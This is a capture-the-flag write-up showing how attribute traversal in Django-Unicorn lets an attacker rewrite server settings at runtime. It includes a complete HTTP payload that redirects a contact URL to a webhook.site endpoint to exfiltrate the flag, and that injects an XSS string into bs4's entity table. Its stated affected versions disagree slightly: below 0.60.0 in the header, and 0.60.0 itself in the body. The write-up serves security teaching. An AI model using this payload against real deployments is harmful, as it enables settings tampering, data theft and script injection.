---
title: "Todo"
date: 2025-07-06
description: Prototype pollution / attribute traversal in Django-Unicorn (<0.60.0) allows in-memory modification of application settings to exfiltrate the flag via an external webhook.
challenge_author: "Not specified"
writeup_author: "sleepyswords & wallsdeep13"
---

**Challenge:** Todo

**Goal:** Exploit a reactive Django Todo application to leak the secret flag.

**Flag:**
- `cube{t0d0_n3v3r_g3ts_t0d0n_3dfa06f8}` - exfiltrated to the attacker's webhook endpoint

---

## Vulnerability

The application is built using **Django-Unicorn**, a component framework that provides full-stack reactive interactivity to Django templates by exchanging JSON payloads between the browser and backend.

Inspection of the deployment configuration (`docker-compose.yml`) shows the package version pinned to `django-unicorn==0.60.0`:

![Docker Compose showing vulnerable django-unicorn version](CubeCTF-2025/images/1_Screenshot_2025-07-06_at_12.24.30_am.png)

This version is vulnerable to **GHSA-g9wf-5777-gq43** (Attribute Traversal / Runtime Object Pollution). In Django-Unicorn versions prior to 0.60.1, the component state synchronization parser did not properly restrict nested property setters. 

By leveraging Python's special dunder attributes (`__init__.__globals__`), an attacker can traverse out of the component scope into Python's global namespace and modify loaded module attributes in server memory during runtime. Specifically, targeting `sys.modules.myproject.urls.settings.CONTACT_URL` allows altering the contact callback URL to an attacker-controlled endpoint.

## Attack Path

### 1. Inspect Component Requests

Observing legitimate user actions on the Todo component reveals AJAX requests sent to `/unicorn/message/todo`. These requests include state metadata such as `csrftoken`, `checksum`, `epoch`, and `hash`.

![Capturing CSRF and state parameters in Burp Suite](CubeCTF-2025/images/2_Screenshot_2025-07-06_at_12.28.22_am.png)
![Inspecting actionQueue structure](CubeCTF-2025/images/3_Screenshot_2025-07-06_at_12.28.57_am.png)

### 2. Craft the Attribute Traversal Payload

To hijack the exfiltration destination, we target the global `CONTACT_URL` setting via:

```
__init__.__globals__.sys.modules.myproject.urls.settings.CONTACT_URL
```

We point this value to a public request logger (`webhook.site`). We construct the following JSON message:

```http
POST /unicorn/message/todo HTTP/1.1
Host: chal.cubectf.com
Accept: application/json
Content-Type: text/plain;charset=UTF-8
Cookie: csrftoken=AimFWPJ2WvSGSpfDi2KQpI4yVrO40MOs
X-CSRFTOKEN: AimFWPJ2WvSGSpfDi2KQpI4yVrO40MOs
X-Requested-With: XMLHttpRequest

{
  "id": "4tAqvKKX",
  "data": {
    "task": "",
    "tasks": []
  },
  "checksum": "8XsptBHo",
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "task",
        "value": "hry"
      },
      "partials": []
    },
    {
      "type": "callMethod",
      "payload": {
        "name": "add"
      },
      "partials": []
    },
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.myproject.urls.settings.CONTACT_URL",
        "value": "https://webhook.site/21805dc4-e44c-442c-9bf1-229a55651dfa"
      }
    },
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<",
        "value": "<img/src=1 onerror=alert('bs4_html_entity_bypass')>"
      }
    }
  ],
  "epoch": 1751725015861,
  "hash": "bCCKDAzY"
}
```

![Sending the modified payload in Burp Suite](CubeCTF-2025/images/4_Screenshot_2025-07-06_at_12.30.43_am.png)

### 3. Exfiltrate the Flag

With `CONTACT_URL` successfully redirected in the server's memory, refreshing the page or triggering a contact event causes the application to send a backend request containing the flag directly to our webhook:

![Capturing the flag in Webhook.site](CubeCTF-2025/images/5_Screenshot_2025-07-06_at_12.31.20_am.png)

Flag received:
```
cube{t0d0_n3v3r_g3ts_t0d0n_3dfa06f8}
```

---

## Notes

- Frameworks providing dynamic client-to-server property mapping must strictly whitelist allowable attribute paths and reject any keys starting with or containing dunder methods (`__`).
- Update `django-unicorn` to version `0.60.1` or above where attribute resolution is sanitized.
